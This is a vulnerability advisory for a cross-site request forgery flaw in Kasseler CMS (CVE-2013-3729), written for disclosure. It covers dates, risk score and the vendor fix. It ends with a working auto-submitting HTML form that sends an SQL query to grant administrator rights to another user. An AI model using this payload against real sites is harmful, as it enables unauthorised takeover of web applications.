```
Advisory ID: HTB23158
Product: Kasseler CMS
Vendor: Kasseler CMS
Vulnerable Version(s): 2 r1223 and probably prior
Tested Version: 2 r1223
Vendor Notification: May 29, 2013
Vendor Patch: June 28, 2013
Public Disclosure: July 3, 2013
Vulnerability Type: Cross-Site Request Forgery [CWE-352]
CVE References: CVE-2013-3729
Risk Level: Medium
CVSSv2 Base Scores: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( <https://www.htbridge.com/advisory/> )

**Root cause of vulnerability:** The vulnerability exists due to the absence of CSRF protection mechanisms in the entire application.
**Weaknesses/vulnerabilities present:** Cross-Site Request Forgery (CSRF)
**Impact of exploitation:** A remote attacker can trick a logged-in administrator to visit a specially crafted webpage, allowing the attacker to execute arbitrary SQL queries in the application's database and gain complete control over the application.
**Attack vectors:** By tricking a logged-in administrator to visit a webpage containing malicious CSRF code.
**Required attacker capabilities/position:** The attacker needs to be able to create a webpage and trick a logged-in administrator to visit it. The attacker does not need to be authenticated to the application.

**Example CSRF exploit:**
The provided exploit grants administrative privileges to the user with ID=2 by sending a crafted SQL query:
```html
<form action="http://[host]/admin.php?module=database&do=sql_query " method="post" name="main">
<input type="hidden" name="query"   value="UPDATE `kasseler`.`kasseler_users` SET `user_level` = '2', `user_group` =
'1' WHERE `kasseler_users`.`uid` =2 LIMIT 1 ;">
<input type="submit" id="btn">
</form>
<script>
document.main.submit();
</script>
```
```